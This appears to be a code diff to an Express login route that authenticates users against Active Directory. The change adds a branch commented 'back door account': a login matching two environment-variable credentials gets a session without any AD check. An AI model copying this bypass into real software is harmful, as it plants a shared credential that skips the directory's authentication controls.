@@ -50,31 +50,40 @@ router.post(
       const email = req.body.email;
       const password = req.body.password;
 
-      ad.authenticate(email, password, function (err, auth) {
-        // if there's an error with AD.
-        if (err) {
-          //console.log("ERROR: " + JSON.stringify(err));
+      // back door account.
+      if (
+        email === process.env.BWG_EMAIL &&
+        password === process.env.BWG_PASS
+      ) {
+        req.session.email = email;
+        res.redirect("/");
+      } else {
+        ad.authenticate(email, password, function (err, auth) {
+          // if there's an error with AD.
+          if (err) {
+            //console.log("ERROR: " + JSON.stringify(err));
 
-          // render login page with error message.
-          return res.render("login", {
-            title: "BWG",
-            message: "Login Error!",
-            layout: "hideLayout.hbs",
-          });
-        }
-        // if login is successful.
-        if (auth) {
-          req.session.email = email;
-          res.redirect("/");
-        } else {
-          // render login page with error message.
-          return res.render("login", {
-            title: "BWG",
-            message: "Login Error!",
-            layout: "hideLayout.hbs",
-          });
-        }
-      });
+            // render login page with error message.
+            return res.render("login", {
+              title: "BWG",
+              message: "Login Error!",
+              layout: "hideLayout.hbs",
+            });
+          }
+          // if login is successful.
+          if (auth) {
+            req.session.email = email;
+            res.redirect("/");
+          } else {
+            // render login page with error message.
+            return res.render("login", {
+              title: "BWG",
+              message: "Login Error!",
+              layout: "hideLayout.hbs",
+            });
+          }
+        });
+      }
     }
   }
 );
